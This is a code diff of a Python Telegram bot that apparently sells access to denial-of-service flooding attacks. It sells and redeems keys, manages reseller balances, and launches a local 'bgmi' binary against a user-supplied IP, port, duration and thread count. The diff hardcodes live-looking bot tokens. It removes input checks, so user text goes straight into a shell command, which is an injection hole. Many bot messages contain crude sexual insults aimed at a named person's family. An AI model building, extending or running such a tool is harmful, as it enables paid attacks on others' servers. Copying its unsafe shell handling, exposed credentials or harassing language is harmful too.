@@ -18,14 +18,14 @@ logging.basicConfig(
 )
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7694477480:AAHfV8Ih8LWcf4CwuqsdhRZmPzZZtUXOyaM'
+TELEGRAM_BOT_TOKEN = '7064980384:AAGfNFTaf81DF3P4NLhHm0TRBSEV1XfBATw'
 OWNER_USERNAME = "Riyahacksyt"
-ALLOWED_GROUP_ID = -1002283210199
-MAX_THREADS = 1000
+ALLOWED_GROUP_ID = -1002295161013
+MAX_THREADS = 200
 max_duration = 120
 bot_open = False
 SPECIAL_MAX_DURATION = 200
-SPECIAL_MAX_THREADS = 2000
+SPECIAL_MAX_THREADS = 1500
 
 # Key Prices
 KEY_PRICES = {
@@ -34,7 +34,8 @@ KEY_PRICES = {
 
 # Special Key Prices
 SPECIAL_KEY_PRICES = {
-    "1D": 70,
+    "7D": 50,  # 7 days special key price
+    "30D": 200  # 30 days special key price
 }
 
 # Image configuration
@@ -47,7 +48,7 @@ START_IMAGES = [
             '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
             '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* 💀\n\n'
             '🔑 *Need keys? DM @Riyahacksyt to purchase*\n\n'
-            '⚠️ *RITIK KI MUMMY KI CHUT BADI MAZBOOT* ⚠️'
+            '⚠️ *RITIK KI MUMMY KI CHUT BADI MAJABUT* ⚠️'
         )
     },
 ]
@@ -97,6 +98,7 @@ owner_keyboard = [
 ]
 owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)
 
+# RE MENU keyboard (shown when owner clicks RE MENU)
 re_menu_keyboard = [
     ['Add Reseller', 'Remove Reseller'],
     ['Add Coin', 'Back to Main']
@@ -118,146 +120,122 @@ GET_SET_COOLDOWN = 11
 GET_SPECIAL_KEY_DURATION = 12
 GET_SPECIAL_KEY_FORMAT = 13
 
+# Load key data from file
 def load_keys():
-    global keys, special_keys, redeemed_users, redeemed_keys_info
-    
     if not os.path.exists(KEY_FILE):
         return
 
     with open(KEY_FILE, "r") as file:
         for line in file:
-            line = line.strip()
-            if not line:
-                continue
-                
-            try:
-                key_type, key_data = line.split(":", 1)
-                if key_type == "ACTIVE_KEY":
-                    parts = key_data.split(",")
-                    if len(parts) == 2:
-                        key, expiration_time = parts
-                        keys[key] = {
-                            'expiration_time': float(expiration_time),
-                            'generated_by': None
-                        }
-                    elif len(parts) == 3:
-                        key, expiration_time, generated_by = parts
-                        keys[key] = {
-                            'expiration_time': float(expiration_time),
-                            'generated_by': int(generated_by)
-                        }
-                elif key_type == "REDEEMED_KEY":
-                    key, generated_by, redeemed_by, expiration_time = key_data.split(",")
-                    redeemed_users[int(redeemed_by)] = float(expiration_time)
-                    redeemed_keys_info[key] = {
-                        'generated_by': int(generated_by),
-                        'redeemed_by': int(redeemed_by)
+            key_type, key_data = line.strip().split(":", 1)
+            if key_type == "ACTIVE_KEY":
+                parts = key_data.split(",")
+                if len(parts) == 2:
+                    key, expiration_time = parts
+                    keys[key] = {
+                        'expiration_time': float(expiration_time),
+                        'generated_by': None
                     }
-                elif key_type == "SPECIAL_KEY":
-                    key, expiration_time, generated_by = key_data.split(",")
-                    special_keys[key] = {
+                elif len(parts) == 3:
+                    key, expiration_time, generated_by = parts
+                    keys[key] = {
                         'expiration_time': float(expiration_time),
                         'generated_by': int(generated_by)
                     }
-                elif key_type == "REDEEMED_SPECIAL_KEY":
-                    key, generated_by, redeemed_by, expiration_time = key_data.split(",")
-                    redeemed_users[int(redeemed_by)] = {
-                        'expiration_time': float(expiration_time),
-                        'is_special': True
-                    }
-                    redeemed_keys_info[key] = {
-                        'generated_by': int(generated_by),
-                        'redeemed_by': int(redeemed_by),
-                        'is_special': True
-                    }
-            except Exception as e:
-                logging.error("Error loading key line: {}. Error: {}".format(line, str(e)))
+            elif key_type == "REDEEMED_KEY":
+                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
+                redeemed_users[int(redeemed_by)] = float(expiration_time)
+                redeemed_keys_info[key] = {
+                    'generated_by': int(generated_by),
+                    'redeemed_by': int(redeemed_by)
+                }
+            elif key_type == "SPECIAL_KEY":
+                key, expiration_time, generated_by = key_data.split(",")
+                special_keys[key] = {
+                    'expiration_time': float(expiration_time),
+                    'generated_by': int(generated_by)
+                }
+            elif key_type == "REDEEMED_SPECIAL_KEY":
+                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
+                redeemed_users[int(redeemed_by)] = {
+                    'expiration_time': float(expiration_time),
+                    'is_special': True
+                }
+                redeemed_keys_info[key] = {
+                    'generated_by': int(generated_by),
+                    'redeemed_by': int(redeemed_by),
+                    'is_special': True
+                }
 
+# Save key data to file
 def save_keys():
     with open(KEY_FILE, "w") as file:
         for key, key_info in keys.items():
             if key_info['expiration_time'] > time.time():
-                file.write("ACTIVE_KEY:{},{}{}\n".format(
-                    key,
-                    key_info['expiration_time'],
-                    ",{}".format(key_info['generated_by']) if key_info['generated_by'] is not None else ""
-                ))
+                file.write(f"ACTIVE_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")
 
         for key, key_info in special_keys.items():
             if key_info['expiration_time'] > time.time():
-                file.write("SPECIAL_KEY:{},{},{}\n".format(
-                    key,
-                    key_info['expiration_time'],
-                    key_info['generated_by']
-                ))
+                file.write(f"SPECIAL_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")
 
         for key, key_info in redeemed_keys_info.items():
             if key_info['redeemed_by'] in redeemed_users:
                 if 'is_special' in key_info and key_info['is_special']:
-                    file.write("REDEEMED_SPECIAL_KEY:{},{},{},{}\n".format(
-                        key,
-                        key_info['generated_by'],
-                        key_info['redeemed_by'],
-                        redeemed_users[key_info['redeemed_by']]['expiration_time']
-                    ))
+                    file.write(f"REDEEMED_SPECIAL_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]['expiration_time']}\n")
                 else:
-                    file.write("REDEEMED_KEY:{},{},{},{}\n".format(
-                        key,
-                        key_info['generated_by'],
-                        key_info['redeemed_by'],
-                        redeemed_users[key_info['redeemed_by']]
-                    ))
+                    file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]}\n")
 
+# Check if bot is used in the allowed group
 def is_allowed_group(update: Update):
-    if not update.effective_chat:
-        return False
     chat = update.effective_chat
     return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID
 
+# Check if the user is the owner
 def is_owner(update: Update):
-    user = update.effective_user
-    return user and user.username == OWNER_USERNAME
+    return update.effective_user.username == OWNER_USERNAME
 
+# Check if the user is a reseller
 def is_reseller(update: Update):
-    user = update.effective_user
-    return user and user.id in resellers
+    return update.effective_user.id in resellers
 
+# Check if the user is authorized to use the bot in private chat
 def is_authorized_user(update: Update):
     return is_owner(update) or is_reseller(update)
 
+# Get a random start image
 def get_random_start_image():
     return random.choice(START_IMAGES)
 
+# Open Bot Command
 async def open_bot(update: Update, context: CallbackContext):
     if not is_owner(update):
-        await update.message.reply_text("❌ Only the owner can use this command!", parse_mode='Markdown')
+        await update.message.reply_text("❌ *Only the owner can use this command!*", parse_mode='Markdown')
         return
     
     global bot_open
     bot_open = True
     await update.message.reply_text(
-        "✅ Bot opened! All users can now attack with regular limits:\n"
-        "⏳ Max Duration: {} sec\n"
-        "🧵 Max Threads: {}\n\n"
-        "🔑 Special key features (200 sec) still require a key!\n\n"
-        "👑 Owner: @Riyahacksyt".format(max_duration, MAX_THREADS),
+        "✅ *Bot opened! All users can now attack without keys.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
 
+# Close Bot Command
 async def close_bot(update: Update, context: CallbackContext):
     if not is_owner(update):
-        await update.message.reply_text("❌ Only the owner can use this command!", parse_mode='Markdown')
+        await update.message.reply_text("❌ *Only the owner can use this command!*", parse_mode='Markdown')
         return
     
     global bot_open
     bot_open = False
     await update.message.reply_text(
-        "✅ Bot closed! Users now need keys to attack.\n\n"
-        "👑 Owner: @Riyahacksyt\n"
-        "🔑 DM for keys: @Riyahacksyt",
+        "✅ *Bot closed! Users now need keys to attack.*\n\n"
+        "👑 *Owner:* @Riyahacksyt\n"
+        "🔑 *DM for keys:* @Riyahacksyt",
         parse_mode='Markdown'
     )
 
+# Start Command
 async def start(update: Update, context: CallbackContext):
     chat = update.effective_chat
     image = get_random_start_image()
@@ -267,9 +245,9 @@ async def start(update: Update, context: CallbackContext):
             await update.message.reply_photo(
                 photo=image['url'],
                 caption=(
-                    "❌ This bot is not authorized to use here.\n\n"
-                    "👑 Owner: @Riyahacksyt\n"
-                    "🔑 DM for keys: @Riyahacksyt"
+                    "❌ *This bot is not authorized to use here.*\n\n"
+                    "👑 *Owner:* @Riyahacksyt\n"
+                    "🔑 *DM for keys:* @Riyahacksyt"
                 ),
                 parse_mode='Markdown'
             )
@@ -301,30 +279,32 @@ async def start(update: Update, context: CallbackContext):
         reply_markup=group_user_markup
     )
 
+# Generate Key Command - Start Conversation
 async def generate_key_start(update: Update, context: CallbackContext):
     if not (is_owner(update) or is_reseller(update)):
         await update.message.reply_text(
-            "❌ Only the owner or resellers can generate keys!\n\n"
-            "👑 Owner: @Riyahacksyt\n"
-            "🔑 DM for keys: @Riyahacksyt",
+            "❌ *Only the owner or resellers can generate keys!*\n\n"
+            "👑 *Owner:* @Riyahacksyt\n"
+            "🔑 *DM for keys:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the duration for the key (e.g., 1H for 1 hour or 1D for 1 day).\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the duration for the key (e.g., 1H for 1 hour or 1D for 1 day).*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_DURATION
 
+# Generate Key Command - Handle Duration Input
 async def generate_key_duration(update: Update, context: CallbackContext):
-    duration_str = update.message.text.upper()
+    duration_str = update.message.text
 
     if duration_str not in KEY_PRICES:
         await update.message.reply_text(
-            "❌ Invalid format! Use 1H, 1D, or 2D.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid format! Use 1H, 1D, or 2D.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
@@ -334,15 +314,15 @@ async def generate_key_duration(update: Update, context: CallbackContext):
         price = KEY_PRICES[duration_str]
         if user_id not in reseller_balances or reseller_balances[user_id] < price:
             await update.message.reply_text(
-                "❌ Insufficient balance! You need {} coins to generate this key.\n\n"
-                "👑 Owner: @Riyahacksyt\n"
-                "💳 DM to recharge balance: @Riyahacksyt".format(price),
+                f"❌ *Insufficient balance! You need {price} coins to generate this key.*\n\n"
+                "👑 *Owner:* @Riyahacksyt\n"
+                "💳 *DM to recharge balance:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
             return ConversationHandler.END
 
     unique_key = os.urandom(4).hex().upper()
-    key = "{}-{}-{}".format(OWNER_USERNAME, duration_str, unique_key)
+    key = f"{OWNER_USERNAME}-{duration_str}-{unique_key}"
     keys[key] = {
         'expiration_time': time.time() + (int(duration_str[:-1]) * 3600 if duration_str.endswith('H') else int(duration_str[:-1]) * 86400),
         'generated_by': user_id
@@ -354,27 +334,28 @@ async def generate_key_duration(update: Update, context: CallbackContext):
     save_keys()
 
     await update.message.reply_text(
-        "🔑 Generated Key: `{}`\n\n"
-        "This key is valid for {}.\n\n"
-        "👑 Bot Owner: @Riyahacksyt\n"
-        "📩 DM for more keys: @Riyahacksyt".format(key, duration_str),
+        f"🔑 *Generated Key:* `{key}`\n\n"
+        f"*This key is valid for {duration_str}.*\n\n"
+        "👑 *Bot Owner:* @Riyahacksyt\n"
+        "📩 *DM for more keys:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return ConversationHandler.END
 
+# Special Key Generation Flow
 async def generate_special_key_start(update: Update, context: CallbackContext):
     if not (is_owner(update) or is_reseller(update)):
         await update.message.reply_text(
-            "❌ Only the owner or resellers can generate special keys!\n\n"
-            "👑 Owner: @Riyahacksyt\n"
-            "🔑 DM for special keys: @Riyahacksyt",
+            "❌ *Only the owner or resellers can generate special keys!*\n\n"
+            "👑 *Owner:* @Riyahacksyt\n"
+            "🔑 *DM for special keys:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the duration for the special key in days (e.g., 7 for 7 days, 30 for 30 days):\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the duration for the special key in days (e.g., 7 for 7 days, 30 for 30 days):*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_SPECIAL_KEY_DURATION
@@ -384,35 +365,36 @@ async def generate_special_key_duration(update: Update, context: CallbackContext
         days = int(update.message.text)
         if days <= 0:
             await update.message.reply_text(
-                "❌ Duration must be greater than 0!\n\n"
-                "👑 Owner: @Riyahacksyt",
+                "❌ *Duration must be greater than 0!*\n\n"
+                "👑 *Owner:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
             return ConversationHandler.END
             
+        # Check if reseller has enough balance
         if is_reseller(update):
             user_id = update.effective_user.id
-            price = SPECIAL_KEY_PRICES.get("{}D".format(days), 9999)
+            price = SPECIAL_KEY_PRICES.get(f"{days}D", 9999)
             if user_id not in reseller_balances or reseller_balances[user_id] < price:
                 await update.message.reply_text(
-                    "❌ Insufficient balance! You need {} coins to generate this special key.\n\n"
-                    "👑 Owner: @Riyahacksyt\n"
-                    "💳 DM to recharge balance: @Riyahacksyt".format(price),
+                    f"❌ *Insufficient balance! You need {price} coins to generate this special key.*\n\n"
+                    "👑 *Owner:* @Riyahacksyt\n"
+                    "💳 *DM to recharge balance:* @Riyahacksyt",
                     parse_mode='Markdown'
                 )
                 return ConversationHandler.END
             
         context.user_data['special_key_days'] = days
         await update.message.reply_text(
-            "⚠️ Enter the custom format for the special key (e.g., 'CHUTIYA-TU-HA' will create key 'SPECIAL-CHUTIYA-TU-HA-XXXX'):\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "⚠️ *Enter the custom format for the special key (e.g., 'CHUTIYA-TU-HA' will create key 'SPECIAL-CHUTIYA-TU-HA-XXXX'):*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return GET_SPECIAL_KEY_FORMAT
     except ValueError:
         await update.message.reply_text(
-            "❌ Invalid input! Please enter a number.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid input! Please enter a number.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
@@ -421,13 +403,17 @@ async def generate_special_key_format(update: Update, context: CallbackContext):
     custom_format = update.message.text.strip().upper()
     days = context.user_data.get('special_key_days', 30)
     
+    # Deduct balance if reseller
     if is_reseller(update):
         user_id = update.effective_user.id
-        price = SPECIAL_KEY_PRICES.get("{}D".format(days), 9999)
+        price = SPECIAL_KEY_PRICES.get(f"{days}D", 9999)
         reseller_balances[user_id] -= price
     
+    # Generate random suffix
     random_suffix = os.urandom(2).hex().upper()
-    key = "SPECIAL-{}-{}".format(custom_format, random_suffix)
+    
+    # Create the key
+    key = f"SPECIAL-{custom_format}-{random_suffix}"
     expiration_time = time.time() + (days * 86400)
     
     special_keys[key] = {
@@ -438,39 +424,39 @@ async def generate_special_key_format(update: Update, context: CallbackContext):
     save_keys()
     
     await update.message.reply_text(
-        "💎 Special Key Generated!\n\n"
-        "🔑 Key: `{}`\n"
-        "⏳ Duration: {} days\n"
-        "⚡ Max Duration: {} sec\n"
-        "🧵 Max Threads: {}\n\n"
-        "👑 Bot Owner: @Riyahacksyt\n"
-        "📩 DM for more special keys: @Riyahacksyt\n\n"
-        "⚠️ This key provides enhanced attack capabilities!".format(
-            key, days, SPECIAL_MAX_DURATION, SPECIAL_MAX_THREADS
-        ),
+        f"💎 *Special Key Generated!*\n\n"
+        f"🔑 *Key:* `{key}`\n"
+        f"⏳ *Duration:* {days} days\n"
+        f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
+        f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
+        f"👑 *Bot Owner:* @Riyahacksyt\n"
+        f"📩 *DM for more special keys:* @Riyahacksyt\n\n"
+        f"⚠️ *This key provides enhanced attack capabilities of ritik ki maa chodne ki!*",
         parse_mode='Markdown'
     )
     return ConversationHandler.END
 
+# Redeem Key Command - Start Conversation
 async def redeem_key_start(update: Update, context: CallbackContext):
     if not is_allowed_group(update):
         await update.message.reply_text(
-            "❌ This command can only be used in the allowed group!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *This command can only be used in the allowed group!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the key to redeem.\n\n"
-        "👑 Owner: @Riyahacksyt\n"
-        "🔑 DM to purchase keys: @Riyahacksyt",
+        "⚠️ *Enter the key to redeem.*\n\n"
+        "👑 *Owner:* @Riyahacksyt\n"
+        "🔑 *DM to purchase keys:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_KEY
 
+# Redeem Key Command - Handle Key Input
 async def redeem_key_input(update: Update, context: CallbackContext):
-    key = update.message.text.strip()
+    key = update.message.text
 
     if key in keys and keys[key]['expiration_time'] > time.time():
         user_id = update.effective_user.id
@@ -482,9 +468,9 @@ async def redeem_key_input(update: Update, context: CallbackContext):
         del keys[key]
         
         await update.message.reply_text(
-            "✅ Key redeemed successfully! You can now use the attack command for {}.\n\n"
-            "👑 Bot Owner: @Riyahacksyt\n"
-            "🔑 DM for more keys: @Riyahacksyt".format(key.split('-')[1]),
+            f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*\n\n"
+            "👑 *Bot Owner:* @Riyahacksyt\n"
+            "🔑 *DM for more keys:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     elif key in special_keys and special_keys[key]['expiration_time'] > time.time():
@@ -501,42 +487,43 @@ async def redeem_key_input(update: Update, context: CallbackContext):
         del special_keys[key]
         
         await update.message.reply_text(
-            "💎 Special Key Redeemed!\n\n"
-            "You now have access to enhanced attacks:\n"
-            "• Max Duration: {} sec\n"
-            "• Max Threads: {}\n\n"
-            "👑 Bot Owner: @Riyahacksyt\n"
-            "📩 DM for more special keys: @Riyahacksyt\n\n"
-            "⚡ Enjoy your enhanced attack capabilities!".format(SPECIAL_MAX_DURATION, SPECIAL_MAX_THREADS),
+            f"💎 *Special Key Redeemed!*\n\n"
+            f"*You now have access to enhanced attacks:*\n"
+            f"• Max Duration: {SPECIAL_MAX_DURATION} sec\n"
+            f"• Max Threads: {SPECIAL_MAX_THREADS}\n\n"
+            f"👑 *Bot Owner:* @Riyahacksyt\n"
+            f"📩 *DM for more special keys:* @Riyahacksyt\n\n"
+            f"⚡ *ABB APP CHESE RITIK KI MUMMY KI CHUT PHAAD PAOGE!*",
             parse_mode='Markdown'
         )
     else:
         await update.message.reply_text(
-            "❌ Invalid or expired key!\n\n"
-            "👑 Owner: @Riyahacksyt\n"
-            "🔑 DM to purchase valid keys: @Riyahacksyt",
+            "❌ *Invalid or expired key!*\n\n"
+            "👑 *Owner:* @Riyahacksyt\n"
+            "🔑 *DM to purchase valid keys:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     
     save_keys()
     return ConversationHandler.END
 
+# Attack Command - Start Conversation
 async def attack_start(update: Update, context: CallbackContext):
     chat = update.effective_chat
 
     if chat.type == "private":
         if not is_authorized_user(update):
             await update.message.reply_text(
-                "❌ This bot is not authorized to use here.\n\n"
-                "👑 Owner: @Riyahacksyt",
+                "❌ *This bot is not authorized to use here.*\n\n"
+                "👑 *Owner:* @Riyahacksyt",
                 parse_mode='Markdown'
             )
             return ConversationHandler.END
 
-   if not is_allowed_group(update):
+    if not is_allowed_group(update):
         await update.message.reply_text(
-            "❌ This command can only be used in the allowed group!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *This command can only be used in the allowed group!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
@@ -547,61 +534,46 @@ async def attack_start(update: Update, context: CallbackContext):
     if current_time - last_attack_time < global_cooldown:
         remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
         await update.message.reply_text(
-            "❌ Please wait! Global cooldown active. Remaining: {} seconds.\n\n"
-            "👑 Owner: @Riyahacksyt".format(remaining_cooldown),
+            f"❌ *Please wait! RITIK KI MUMMY KI CHUDAI CHALU HA. Remaining: {remaining_cooldown} seconds.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
-     user_id = update.effective_user.id
-    has_special_key = user_id in redeemed_users and (isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'))
-    
-    if bot_open or (user_id in redeemed_users):
+    user_id = update.effective_user.id
+
+    if bot_open or (user_id in redeemed_users and (isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special') or isinstance(redeemed_users[user_id], (int, float)))):
         await update.message.reply_text(
-            "⚠️ Enter the attack arguments: <ip> <port> <duration> <threads>\n\n"
-            "ℹ️ Your current limits:\n"
-            "⏳ Max Duration: {} sec\n"
-            "🧵 Max Threads: {}\n\n"
-            "👑 Owner: @Riyahacksyt".format(
-                SPECIAL_MAX_DURATION if has_special_key else max_duration,
-                SPECIAL_MAX_THREADS if has_special_key else MAX_THREADS
-            ),
+            "⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return GET_ATTACK_ARGS
     else:
         await update.message.reply_text(
-            "❌ You need a valid key to start an attack!\n\n"
-            "👑 Owner: @Riyahacksyt\n"
-            "🔑 DM to purchase keys: @Riyahacksyt",
+            "❌ *You need a valid key to start an attack!*\n\n"
+            "👑 *Owner:* @Riyahacksyt\n"
+            "🔑 *DM to purchase keys:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
+# Attack Command - Handle Attack Input
 async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time, running_attacks
 
     args = update.message.text.split()
     if len(args) != 4:
         await update.message.reply_text(
-            "❌ Invalid input! Please enter <ip> <port> <duration> <threads>.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid input! Please enter <ip> <port> <duration> <threads>.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
-    try:
-        ip = args[0]
-        port = int(args[1])
-        duration = int(args[2])
-        threads = int(args[3])
-    except ValueError:
-        await update.message.reply_text(
-            "❌ Invalid input! Port, duration and threads must be numbers.\n\n"
-            "👑 Owner: @Riyahacksyt",
-            parse_mode='Markdown'
-        )
-        return ConversationHandler.END
+    ip, port, duration, threads = args
+    duration = int(duration)
+    threads = int(threads)
 
     user_id = update.effective_user.id
     is_special = False
@@ -615,47 +587,46 @@ async def attack_input(update: Update, context: CallbackContext):
 
     if duration > max_allowed_duration:
         await update.message.reply_text(
-            "❌ Attack duration exceeds your max limit ({} sec)!\n\n"
-            "👑 Owner: @Riyahacksyt".format(max_allowed_duration),
+            f"❌ *Attack duration exceeds the max limit ({max_allowed_duration} sec)!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     if threads > max_allowed_threads:
         await update.message.reply_text(
-            "❌ Number of threads exceeds your max limit ({})!\n\n"
-            "👑 Owner: @Riyahacksyt".format(max_allowed_threads),
+            f"❌ *Number of threads exceeds the max limit ({max_allowed_threads})!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     last_attack_time = time.time()
-    attack_id = "{}:{}-{}".format(ip, port, time.time())
+    
+    attack_id = f"{ip}:{port}-{time.time()}"
     running_attacks[attack_id] = {
-        'user_id': user_id,
+        'user_id': update.effective_user.id,
         'start_time': time.time(),
         'duration': duration,
         'is_special': is_special
     }
 
-    attack_type = "⚡ SPECIAL ATTACK ⚡" if is_special else "⚔️ Attack Started!"
+    attack_type = "⚡ *SPECIAL ATTACK* ⚡" if is_special else "⚔️ *Attack Started!*"
     
     await update.message.reply_text(
-        "{}\n"
-        "🎯 Target: {}:{}\n"
-        "🕒 Duration: {} sec\n"
-        "🧵 Threads: {}\n\n"
-        "👑 Bot Owner: @Riyahacksyt\n\n"
-        "🔥 Attack is now running!".format(
-            attack_type, ip, port, duration, threads
-        ),
+        f"{attack_type}\n"
+        f"🎯 *Target*: {ip}:{port}\n"
+        f"🕒 *Duration*: {duration} sec\n"
+        f"🧵 *Threads*: {threads}\n\n"
+        f"👑 *Bot Owner:* @Riyahacksyt\n\n"
+        f"🔥 *RITKI KI MUMMY KI CHUT PHATNA CHALU HOGYI HA ! 💥*",
         parse_mode='Markdown'
     )
 
     async def run_attack():
         try:
             process = await asyncio.create_subprocess_shell(
-                "./bgmi {} {} {} {}".format(ip, port, duration, threads),
+                f"./bgmi {ip} {port} {duration} {threads}",
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE
             )
@@ -667,82 +638,83 @@ async def attack_input(update: Update, context: CallbackContext):
 
             if process.returncode == 0:
                 await update.message.reply_text(
-                    "✅ Attack Finished!\n"
-                    "🎯 Target: {}:{}\n"
-                    "🕒 Duration: {} sec\n"
-                    "🧵 Threads: {}\n\n"
-                    "👑 Bot Owner: @Riyahacksyt\n\n"
-                    "🔥 Attack completed successfully!".format(ip, port, duration, threads),
+                    f"✅ *Attack Finished!*\n"
+                    f"🎯 *Target*: {ip}:{port}\n"
+                    f"🕒 *Duration*: {duration} sec\n"
+                    f"🧵 *Threads*: {threads}\n\n"
+                    f"👑 *Bot Owner:* @Riyahacksyt\n\n"
+                    f"🔥 *RITIK KI MUMMY KI CHUT PHAT CHUKI HA.*",
                     parse_mode='Markdown'
                 )
             else:
                 await update.message.reply_text(
-                    "❌ Attack Failed!\n"
-                    "🎯 Target: {}:{}\n"
-                    "🕒 Duration: {} sec\n"
-                    "🧵 Threads: {}\n\n"
-                    "👑 Bot Owner: @Riyahacksyt\n\n"
-                    "💥 Error: {}".format(
-                        ip, port, duration, threads,
-                        stderr.decode().strip()
-                    ),
+                    f"❌ *Attack Failed!*\n"
+                    f"🎯 *Target*: {ip}:{port}\n"
+                    f"🕒 *Duration*: {duration} sec\n"
+                    f"🧵 *Threads*: {threads}\n\n"
+                    f"👑 *Bot Owner:* @Riyahacksyt\n\n"
+                    f"💥 *Error*: {stderr.decode().strip()}",
                     parse_mode='Markdown'
                 )
         except Exception as e:
-            logging.error("Error in attack execution: {}".format(str(e)))
+            logging.error(f"Error in attack execution: {str(e)}")
             if attack_id in running_attacks:
                 del running_attacks[attack_id]
             await update.message.reply_text(
-                "❌ Attack Error!\n"
-                "🎯 Target: {}:{}\n\n"
-                "👑 Bot Owner: @Riyahacksyt\n\n"
-                "💥 Error: {}".format(ip, port, str(e)),
+                f"❌ *Attack Error!*\n"
+                f"🎯 *Target*: {ip}:{port}\n\n"
+                f"👑 *Bot Owner:* @Riyahacksyt\n\n"
+                f"💥 *Error*: {str(e)}",
                 parse_mode='Markdown'
             )
 
     asyncio.create_task(run_attack())
+
     return ConversationHandler.END
 
+# Set Cooldown Command - Start Conversation
 async def set_cooldown_start(update: Update, context: CallbackContext):
     if not is_owner(update):
         await update.message.reply_text(
-            "❌ Only the owner can set cooldown!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only the owner can set cooldown!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
 
     await update.message.reply_text(
-        "⚠️ Enter the global cooldown duration in seconds.\n\n"
-        "👑 Owner: @Riyahacksyt",
+        "⚠️ *Enter the global cooldown duration in seconds.*\n\n"
+        "👑 *Owner:* @Riyahacksyt",
         parse_mode='Markdown'
     )
     return GET_SET_COOLDOWN
 
+# Set Cooldown Command - Handle Cooldown Input
 async def set_cooldown_input(update: Update, context: CallbackContext):
     global global_cooldown
 
     try:
         global_cooldown = int(update.message.text)
         await update.message.reply_text(
-            "✅ Global cooldown set to {} seconds!\n\n"
-            "👑 Owner: @Riyahacksyt".format(global_cooldown),
+            f"✅ *Global cooldown set to {global_cooldown} seconds!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
     except ValueError:
         await update.message.reply_text(
-            "❌ Invalid input! Please enter a number.\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Invalid input! Please enter a number.*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
     return ConversationHandler.END
 
+# Show Active, Redeemed, and Expired Keys
 async def show_keys(update: Update, context: CallbackContext):
     if not (is_owner(update) or is_reseller(update)):
         await update.message.reply_text(
-            "❌ Only the owner or resellers can view keys!\n\n"
-            "👑 Owner: @Riyahacksyt",
+            "❌ *Only the owner or resellers can view keys!*\n\n"
+            "👑 *Owner:* @Riyahacksyt",
             parse_mode='Markdown'
         )
         return
@@ -767,14 +739,9 @@ async def show_keys(update: Update, context: CallbackContext):
                 except Exception:
                     generated_by_username = "Unknown"
                     
-            active_keys.append("🔑 `{}` (Generated by @{}, Expires in {}h {}m)".format(
-                escape_markdown(key, version=2),
-                generated_by_username,
-                hours,
-                minutes
-            ))
